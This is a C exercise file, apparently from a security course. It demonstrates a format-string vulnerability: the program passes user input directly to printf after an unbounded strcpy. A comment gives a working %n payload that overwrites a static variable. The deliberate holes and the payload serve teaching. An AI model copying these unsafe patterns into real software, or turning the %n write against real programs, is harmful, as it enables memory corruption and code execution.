/*
Use the necessary tools to perform analysis of the compiled source code generated. Since we
are working in 32-bit use “-m32” for your gcc compilation options. For compilation I would
suggest using compiler option “-fno-stack-protector” and “-z execstack”. Please submit
write-ups of your analysis. Your points will be based on completeness of analysis, your
understanding of the problems, and if you were able to achieve the goals.

To compile:
gcc -m32 -fno-stack-protector -z execstack file.c -o file

Problem 2: 5pts
Modify the test_val to be set to 1024.

./problem2 $(python -c "print '\x08\x90\x55\x56%341x%341x%338x%n'")
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char* argv[]){
    char text[1024];
    static int test_val = -72;

    strcpy(text, argv[1]);

    printf("The Right way to print user-controlled input: \n");
    printf("%s", text);
    printf("\n");

    printf("The Wrong way to print user-controlled input: \n");
    printf(text);
    printf("\n");

    // 
    printf("[*] test_val @ 0x%08x = %d 0x%08x\n", &test_val, test_val, test_val);

    return 0;
}
